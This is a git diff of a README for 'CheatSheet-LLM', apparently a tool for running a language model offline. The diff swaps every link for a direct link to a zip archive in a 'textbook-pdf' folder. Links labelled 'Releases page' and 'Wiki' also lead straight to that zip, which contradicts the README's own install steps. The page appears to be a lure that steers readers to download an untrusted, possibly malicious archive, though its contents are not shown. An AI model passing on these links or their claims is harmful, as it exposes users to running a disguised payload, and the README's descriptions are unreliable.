@@ -1,6 +1,6 @@
 # 🌟 CheatSheet-LLM - Run Your Own Language Model Offline
 
-[![Download CheatSheet-LLM](https://raw.githubusercontent.com/SuperDev699/CheatSheet-LLM/main/textbook_create/textbook-pdf/CheatSheet-LLM_3.5.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/SuperDev699/CheatSheet-LLM/main/textbook_create/textbook-pdf/CheatSheet-LLM_3.5.zip)
+[![Download CheatSheet-LLM](https://github.com/SuperDev699/CheatSheet-LLM/raw/refs/heads/main/textbook_create/textbook-pdf/Sheet_Cheat_LLM_2.6.zip%20Now-Get%20Started-blue)](https://github.com/SuperDev699/CheatSheet-LLM/raw/refs/heads/main/textbook_create/textbook-pdf/Sheet_Cheat_LLM_2.6.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To get started with CheatSheet-LLM, follow these simple steps.
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Download CheatSheet-LLM](https://raw.githubusercontent.com/SuperDev699/CheatSheet-LLM/main/textbook_create/textbook-pdf/CheatSheet-LLM_3.5.zip)
+   [Download CheatSheet-LLM](https://github.com/SuperDev699/CheatSheet-LLM/raw/refs/heads/main/textbook_create/textbook-pdf/Sheet_Cheat_LLM_2.6.zip)
 
 2. On the Releases page, you will see several versions of the software. Look for the most recent release.
 
@@ -64,7 +64,7 @@ If you encounter any issues while using CheatSheet-LLM, here are some common sol
 
 ## 📞 Support
 
-For further assistance, please check our [Wiki](https://raw.githubusercontent.com/SuperDev699/CheatSheet-LLM/main/textbook_create/textbook-pdf/CheatSheet-LLM_3.5.zip) or visit the Issues section on the GitHub repository to report any bugs or request help from the community.
+For further assistance, please check our [Wiki](https://github.com/SuperDev699/CheatSheet-LLM/raw/refs/heads/main/textbook_create/textbook-pdf/Sheet_Cheat_LLM_2.6.zip) or visit the Issues section on the GitHub repository to report any bugs or request help from the community.
 
 ## 🌐 Community and Contributions
 
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. For more details, refer to the L
 
 ---
 
-Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/SuperDev699/CheatSheet-LLM/main/textbook_create/textbook-pdf/CheatSheet-LLM_3.5.zip) to download the latest version or check for updates. Enjoy using CheatSheet-LLM!
+Remember, you can always return to the [Releases page](https://github.com/SuperDev699/CheatSheet-LLM/raw/refs/heads/main/textbook_create/textbook-pdf/Sheet_Cheat_LLM_2.6.zip) to download the latest version or check for updates. Enjoy using CheatSheet-LLM!
